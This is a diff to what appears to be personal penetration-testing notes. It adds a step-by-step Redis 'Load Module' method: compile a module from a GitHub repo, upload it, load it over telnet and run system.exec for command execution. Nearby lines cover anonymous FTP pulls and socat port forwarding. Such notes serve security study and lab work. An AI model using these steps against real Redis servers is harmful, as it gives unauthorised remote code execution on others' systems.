@@ -49,6 +49,15 @@ Notes related to Vuln Assmnt/PenTesting
 > 1. wget -r -nH --cut-dirs=5 -nc ftp://anonymous:nopassneeded@192.168.75.65//Logs
 > 1. ncftp -u [user] -p [pass] [server]
 
+#### Exploiting Redis service --- Usually running on 6379
+> 1. "Redis Load Module" technique, for this you need to upload a file to SERVER, so something like FTP or SSH with WRITE access
+> 1. Download this repo -> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
+> 1. Run "make" command and put the "module.so" file to server
+> 1. Next connect to Redis server via telent; command - telnet 192.168.XXX.XXX 6379
+> 1. and load this moudle; command - MODULE LOAD /path/of/module.so
+> 1. if everything goes well, you should see "+OK"
+> 1. in redis run command: system.exec "id" and you should see "id" command output
+
 #### Portforwarding local service 8080
 > using **socat** for local port forwarding. In this example port 8080 is running locally and we will forward and make it public to 8089.\
 > socat TCP-LISTEN:8089,fork TCP:127.0.0.1:8080
